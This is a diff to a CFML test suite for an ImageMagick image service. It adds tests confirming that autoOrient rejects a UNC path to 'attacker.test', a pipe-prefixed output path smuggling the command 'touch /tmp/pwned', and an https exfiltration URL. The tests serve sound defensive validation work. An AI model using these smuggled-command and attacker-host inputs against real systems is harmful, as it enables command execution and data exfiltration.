@@ -93,6 +93,27 @@ component extends="tests.resources.baseTest" {
                 )).toThrow('ImageMagick.InputValidationException');
             });
 
+            it('Throws for a path using a UNC network path', () => {
+                expect(() => imageService.autoOrient(
+                    path       = '\\attacker.test\share\evil.jpg',
+                    outputPath = tempDir & '/out.jpg'
+                )).toThrow('ImageMagick.InputValidationException');
+            });
+
+            it('Throws for an outputPath starting with a pipe (ImageMagick PIPE coder command execution)', () => {
+                expect(() => imageService.autoOrient(
+                    path       = expandPath('/tests/resources/jpg_example.jpg'),
+                    outputPath = '|touch /tmp/pwned'
+                )).toThrow('ImageMagick.InputValidationException');
+            });
+
+            it('Throws for an outputPath using an ImageMagick coder/protocol prefix', () => {
+                expect(() => imageService.autoOrient(
+                    path       = expandPath('/tests/resources/jpg_example.jpg'),
+                    outputPath = 'https://attacker.test/exfil'
+                )).toThrow('ImageMagick.InputValidationException');
+            });
+
             it('Throws when ImageMagick fails to produce the output file', () => {
                 expect(() => imageService.autoOrient(
                     path       = expandPath('/tests/resources/jpg_example.jpg'),
